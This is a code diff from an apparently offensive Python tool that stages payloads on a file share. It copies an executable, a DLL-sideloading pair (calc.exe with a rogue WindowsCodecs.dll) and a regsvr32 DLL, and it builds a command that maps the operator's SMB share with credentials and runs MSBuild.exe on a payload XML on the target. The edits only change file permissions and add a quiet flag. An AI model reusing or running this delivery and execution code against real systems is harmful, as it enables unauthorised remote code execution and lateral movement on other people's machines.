@@ -763,7 +763,7 @@ def gen_payload_exe(share_name, payload_name, addresses_array):
     addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
 
     os.system('sudo cp {}/src/exepayload /var/tmp/{}/{}.exe'.format(cwd, share_name, payload_name))
-    os.system('chmod +rx /var/tmp/{}/{}.exe'.format(share_name, payload_name))
+    os.system('sudo chmod uog+rx /var/tmp/{}/{}.exe'.format(share_name, payload_name))
 
     with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
         for addr in addresses_array:
@@ -773,10 +773,10 @@ def gen_payload_exe(share_name, payload_name, addresses_array):
 def gen_payload_dllsideload(share_name, addresses_array):
 
     os.system('sudo cp {}/src/calc /var/tmp/{}/calc.exe'.format(cwd, share_name))
-    os.system('chmod +rx /var/tmp/{}/calc.exe'.format(share_name))
+    os.system('sudo chmod uog+rx /var/tmp/{}/calc.exe'.format(share_name))
 
     os.system('sudo cp {}/src/WindowsCodecs /var/tmp/{}/WindowsCodecs.dll'.format(cwd, share_name))
-    os.system('chmod +rx /var/tmp/{}/WindowsCodecs.dll'.format(share_name))
+    os.system('sudo chmod uog+rx /var/tmp/{}/WindowsCodecs.dll'.format(share_name))
 
     with open('/var/tmp/{}/address.txt'.format(share_name), 'w') as f:
         for addr in addresses_array:
@@ -787,7 +787,7 @@ def gen_payload_regsvr32(share_name, payload_name, addresses_array):
     addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
 
     os.system('sudo cp {}/src/regsvr32payload /var/tmp/{}/{}.dll'.format(cwd, share_name, payload_name))
-    os.system('chmod +rx /var/tmp/{}/{}.dll'.format(share_name, payload_name))
+    os.system('sudo chmod uog+rx /var/tmp/{}/{}.dll'.format(share_name, payload_name))
 
     with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
         for addr in addresses_array:
@@ -1382,8 +1382,9 @@ if __name__ == '__main__':
         elif options.payload == 'dllsideload':
             gen_payload_dllsideload(share_name, addresses)
 
-
-        print("\n[This is where the fun begins]\n{} Executing payload via {}\n".format(green_plus, options.method))
+        if options.oe == False:
+            print("\n[This is where the fun begins]\n{} Executing payload via {}\n".format(green_plus, options.method))
+            
         if options.payload == 'msbuild':
             command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
         elif options.payload == 'regsvr32':
